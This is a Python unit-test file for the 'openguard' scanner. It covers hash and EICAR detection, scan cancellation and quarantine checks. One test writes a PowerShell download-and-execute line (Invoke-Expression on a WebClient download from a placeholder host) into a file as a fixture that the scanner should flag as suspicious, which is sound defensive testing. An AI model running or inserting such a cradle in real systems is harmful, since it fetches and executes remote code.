from __future__ import annotations

import hashlib
import os
import tempfile
import threading
import unittest
from pathlib import Path
from unittest.mock import patch

from support import add_src_to_path

add_src_to_path()

from openguard.models import ScanFinding, ScanVerdict, SignatureStatus
from openguard.scanner import Scanner, _eicar_bytes
from openguard.storage import Database


class ScannerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)
        self.previous_data_dir = os.environ.get("OPENGUARD_DATA_DIR")
        os.environ["OPENGUARD_DATA_DIR"] = str(self.root / "data")
        self.database = Database(self.root / "test.db")

    def tearDown(self) -> None:
        if self.previous_data_dir is None:
            os.environ.pop("OPENGUARD_DATA_DIR", None)
        else:
            os.environ["OPENGUARD_DATA_DIR"] = self.previous_data_dir
        self.temporary.cleanup()

    def test_clean_file(self) -> None:
        target = self.root / "clean.txt"
        target.write_text("ordinary text", encoding="utf-8")
        scanner = Scanner(self.database, amsi_enabled=False)
        finding = scanner.scan_file(target)
        scanner.close()
        self.assertEqual(finding.verdict, ScanVerdict.CLEAN)
        self.assertEqual(finding.sha256, hashlib.sha256(b"ordinary text").hexdigest())

    def test_suspicious_script_has_explainable_result(self) -> None:
        target = self.root / "loader.ps1"
        target.write_text(
            "Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://example.invalid/a'))",
            encoding="utf-8",
        )
        scanner = Scanner(self.database, amsi_enabled=False)
        finding = scanner.scan_file(target)
        scanner.close()
        self.assertEqual(finding.verdict, ScanVerdict.SUSPICIOUS)
        self.assertGreaterEqual(len(finding.reasons), 2)

    def test_known_hash_is_malicious(self) -> None:
        target = self.root / "known.bin"
        target.write_bytes(b"inert test payload")
        digest = hashlib.sha256(target.read_bytes()).hexdigest()
        scanner = Scanner(
            self.database,
            amsi_enabled=False,
            known_hashes={digest: {"name": "Unit.Test.Signature"}},
        )
        finding = scanner.scan_file(target)
        scanner.close()
        self.assertEqual(finding.verdict, ScanVerdict.MALICIOUS)
        self.assertIn("Unit.Test.Signature", finding.reasons[0])

    def test_eicar_detection_without_writing_signature_to_disk(self) -> None:
        target = self.root / "placeholder.txt"
        target.write_bytes(b"placeholder")
        eicar = _eicar_bytes()
        with patch(
            "openguard.scanner._read_hash_and_content",
            return_value=(hashlib.sha256(eicar).hexdigest(), eicar, False),
        ):
            scanner = Scanner(self.database, amsi_enabled=False, known_hashes={})
            finding = scanner.scan_file(target)
            scanner.close()
        self.assertEqual(finding.verdict, ScanVerdict.MALICIOUS)
        self.assertTrue(any("EICAR" in reason for reason in finding.reasons))

    def test_cancelled_scan(self) -> None:
        target = self.root / "cancel.txt"
        target.write_text("data", encoding="utf-8")
        cancel = threading.Event()
        cancel.set()
        scanner = Scanner(self.database, amsi_enabled=False)
        finding = scanner.scan_file(target, cancel)
        scanner.close()
        self.assertEqual(finding.verdict, ScanVerdict.CANCELLED)

    def test_quarantine_moves_only_explicit_detection_and_records_metadata(self) -> None:
        target = self.root / "suspicious.bin"
        target.write_bytes(b"inert")
        finding = ScanFinding(
            str(target),
            ScanVerdict.SUSPICIOUS,
            60,
            ("Unit test",),
            sha256=hashlib.sha256(b"inert").hexdigest(),
            signature=SignatureStatus.UNKNOWN,
        )
        scanner = Scanner(self.database, amsi_enabled=False)
        destination = scanner.quarantine(finding)
        scanner.close()
        self.assertFalse(target.exists())
        self.assertTrue(destination.exists())
        self.assertTrue(destination.with_suffix(".json").exists())

    def test_quarantine_refuses_file_changed_after_scan(self) -> None:
        target = self.root / "changed.bin"
        target.write_bytes(b"replacement content")
        stale = ScanFinding(
            str(target),
            ScanVerdict.MALICIOUS,
            100,
            ("Known signature",),
            sha256=hashlib.sha256(b"old content").hexdigest(),
        )
        scanner = Scanner(self.database, amsi_enabled=False)
        with self.assertRaisesRegex(ValueError, "changed after"):
            scanner.quarantine(stale)
        scanner.close()
        self.assertTrue(target.exists())


if __name__ == "__main__":
    unittest.main()
